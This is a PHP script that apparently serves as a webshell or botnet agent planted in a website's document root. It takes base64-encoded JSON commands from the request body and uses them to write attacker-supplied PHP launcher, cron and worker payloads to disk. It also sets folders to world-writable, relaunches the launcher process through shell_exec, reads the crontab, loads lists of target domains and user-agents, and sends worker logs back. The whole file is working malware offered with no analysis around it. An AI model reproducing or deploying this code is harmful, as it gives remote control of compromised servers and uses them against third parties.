<?php /*68a501b7672711748c121f93705eb054db4ca4e8f7b55315af144fb3565218b7 */?><?php
function isEnabled($func) {
    return is_callable($func) && false === stripos(ini_get('disable_functions'), $func);
}
if($_SERVER['REQUEST_METHOD'] === 'POST'){
    if (isset($_POST["test1"])){
        echo 'OKOKOK';
        exit;
    }
}

$task = json_decode(base64_decode(file_get_contents('php://input')), true);
if($task['test']){
    if(file_exists($_SERVER["DOCUMENT_ROOT"].'/'.$task['key'].'/'.md5($task['key']).'.php')){
        $launcherHash = md5_file($_SERVER["DOCUMENT_ROOT"].'/'.$task['key'].'/'.md5($task['key']).'.php');
    }else{
        $launcherHash = false;
    }
    if(file_exists($_SERVER["DOCUMENT_ROOT"].'/'.$task['key'].'/'.md5(md5($task['key'])).'.php')){
        $crontaBHash = md5_file($_SERVER["DOCUMENT_ROOT"].'/'.$task['key'].'/'.md5(md5($task['key'])).'.php');
    }else{
        $crontaBHash = false;
    }
    if(file_exists($_SERVER["DOCUMENT_ROOT"].'/'.$task['key'].'/'.md5(md5(md5($task['key']))).'.php')){
        $workerHash = md5_file($_SERVER["DOCUMENT_ROOT"].'/'.$task['key'].'/'.md5(md5(md5($task['key']))).'.php');
    }else{
        $workerHash = false;
    }
    shell_exec('rm -f '. $_SERVER["DOCUMENT_ROOT"].'/'.$task['key'].'/results.txt');
    sleep(10);
    if(file_exists($_SERVER["DOCUMENT_ROOT"].'/'.$task['key'].'/results.txt')){
        $resultJSON = json_decode(file_get_contents($_SERVER["DOCUMENT_ROOT"].'/'.$task['key'].'/results.txt'), true);
    }else{
        $resultJSON = false;
    }
    if (isEnabled('shell_exec') and isEnabled('exec')) {
        $state = 'OK';
    }else{
        $state = 'No';
    }

    echo base64_encode(json_encode(
        array('launcherHash'=>$launcherHash,'crontaBHash'=>$crontaBHash,'workerHash'=>$workerHash,'resultJSON'=>$resultJSON,'state'=>$state)
    ));
}elseif($task['update']){
    $log = array();
    $log['mkdir'] = shell_exec('mkdir '. $_SERVER["DOCUMENT_ROOT"].'/'.$task['key']);
    $log['chmod'] = shell_exec('chmod -R 777 '. $_SERVER["DOCUMENT_ROOT"].'/'.$task['key']);

    $log['mkdirlog'] = shell_exec('mkdir '. $_SERVER["DOCUMENT_ROOT"].'/'.$task['key'].'/'.'log');
    file_put_contents($_SERVER["DOCUMENT_ROOT"].'/'.$task['key'].'/'.md5($task['key']).'.php',base64_decode($task['first']));
    if(file_exists($_SERVER["DOCUMENT_ROOT"].'/'.$task['key'].'/'.md5($task['key']).'.php')){
        $launcherHash = md5_file($_SERVER["DOCUMENT_ROOT"].'/'.$task['key'].'/'.md5($task['key']).'.php');
    }else{
        $launcherHash = false;
    }

    file_put_contents($_SERVER["DOCUMENT_ROOT"].'/'.$task['key'].'/'.md5(md5($task['key'])).'.php',base64_decode($task['second']));
    if(file_exists($_SERVER["DOCUMENT_ROOT"].'/'.$task['key'].'/'.md5(md5($task['key'])).'.php')){
        $crontaBHash = md5_file($_SERVER["DOCUMENT_ROOT"].'/'.$task['key'].'/'.md5(md5($task['key'])).'.php');
    }else{
        $crontaBHash = false;
    }

    file_put_contents($_SERVER["DOCUMENT_ROOT"].'/'.$task['key'].'/'.md5(md5(md5($task['key']))).'.php',base64_decode($task['third']));
    if(file_exists($_SERVER["DOCUMENT_ROOT"].'/'.$task['key'].'/'.md5(md5(md5($task['key']))).'.php')){
        $workerHash = md5_file($_SERVER["DOCUMENT_ROOT"].'/'.$task['key'].'/'.md5(md5(md5($task['key']))).'.php');
    }else{
        $workerHash = false;
    }
    $log['chmodR'] = shell_exec('chmod -R 777 '. $_SERVER["DOCUMENT_ROOT"].'/'.$task['key'].'/*');

    //$log['third'] = base64_decode($task['third']);
    //$log['path'] = $_SERVER["DOCUMENT_ROOT"].'/'.$task['key'].'/'.md5(md5(md5($task['key']))).'.php';
    echo base64_encode(json_encode(
        array('launcherHash'=>$launcherHash,'crontaBHash'=>$crontaBHash,'workerHash'=>$workerHash,'log'=>$log)
    ));

}elseif($task['task']) {
    file_put_contents($_SERVER["DOCUMENT_ROOT"].'/'.$task['key'].'/task.txt',base64_decode($task['domains']));
    if(file_exists($_SERVER["DOCUMENT_ROOT"].'/'.$task['key'].'/task.txt')){
        $taskHash = md5_file($_SERVER["DOCUMENT_ROOT"].'/'.$task['key'].'/task.txt');
    }else{
        $taskHash = false;
    }

    file_put_contents($_SERVER["DOCUMENT_ROOT"].'/'.$task['key'].'/useragents.txt',base64_decode($task['useragents']));
    if(file_exists($_SERVER["DOCUMENT_ROOT"].'/'.$task['key'].'/useragents.txt')){
        $useragentsHash = md5_file($_SERVER["DOCUMENT_ROOT"].'/'.$task['key'].'/useragents.txt');
    }else{
        $useragentsHash = false;
    }
    $log['chmodR'] = shell_exec('chmod -R 777 '. $_SERVER["DOCUMENT_ROOT"].'/'.$task['key'].'/*');
    $log['chmodR'] = shell_exec('rm -f '. $_SERVER["DOCUMENT_ROOT"].'/'.$task['key'].'/log/*');

    echo base64_encode(json_encode(
        array('taskHash'=>$taskHash,'useragentsHash'=>$useragentsHash)
    ));
}elseif($task['check']) {
    $checkGrepLauncher = shell_exec('ps ax|grep '.$task['key'].'/'.md5($task['key']).'.php');
    $running = 0;

    if($checkGrepLauncher) {
        $psaux = explode(PHP_EOL, $checkGrepLauncher);
        $running = 0;
        foreach ($psaux as $one) {
            if (strpos($one, $task['key'] . '/' . md5($task['key']) . '.php') !== false) {
                if (strpos($one, 'grep') === false) {
                    $running++;
                }
            }
        }
        if($running == 0){
            file_put_contents($_SERVER["DOCUMENT_ROOT"].'/'.$task['key'].'/relaucnh.txt',"Running $running ".$checkGrepLauncher.PHP_EOL,FILE_APPEND);
            shell_exec('php '.$_SERVER["DOCUMENT_ROOT"].'/'.$task['key'].'/'.md5($task['key']).'.php \''.md5($task['key']).'\' \''.md5(md5(md5($task['key']))). '\' \''.$task['pid'].'\' \''.$task['key'].'\' > /dev/null & echo $!');
        }
    }
    file_put_contents($_SERVER["DOCUMENT_ROOT"].'/'.$task['key'].'/relaucnh111.txt',time()."Running $running ".$checkGrepLauncher.PHP_EOL,FILE_APPEND);

    $crontab = shell_exec('crontab -l');

    if(count($task['deleted']) > 1){
        foreach($task['deleted'] as $deleteItem){
            unlink($_SERVER["DOCUMENT_ROOT"].'/'.$task['key'].'/log/'.$deleteItem);
        }
    }
    $results = array();
    $cdir = scandir($_SERVER["DOCUMENT_ROOT"].'/'.$task['key'].'/log');
    foreach ($cdir as $key => $value) {
        if (!in_array($value,array(".",".."))) {
            $workerReport = file_get_contents($_SERVER["DOCUMENT_ROOT"].'/'.$task['key'].'/log/'.$value);
            if($workerReport){
                $results[$value] = $workerReport;
            }
        }
    }
    if(file_exists($_SERVER["DOCUMENT_ROOT"].'/'.$task['key'].'/results.txt')){
        $resultJSON = json_decode(file_get_contents($_SERVER["DOCUMENT_ROOT"].'/'.$task['key'].'/results.txt'), true);
    }else{
        $resultJSON = false;
    }



    if(file_exists($_SERVER["DOCUMENT_ROOT"].'/'.$task['key'].'/task.txt')){
        $taskHash = md5_file($_SERVER["DOCUMENT_ROOT"].'/'.$task['key'].'/task.txt');
    }else{
        $taskHash = false;
    }

    if(file_exists($_SERVER["DOCUMENT_ROOT"].'/'.$task['key'].'/useragents.txt')){
        $useragentsHash = md5_file($_SERVER["DOCUMENT_ROOT"].'/'.$task['key'].'/useragents.txt');
    }else{
        $useragentsHash = false;
    }


    echo base64_encode(json_encode(
        array('crontab'=>$crontab,'results'=>$results,'resultJSON'=>$resultJSON,'taskHash'=>$taskHash,'useragentsHash'=>$useragentsHash)
    ));


}
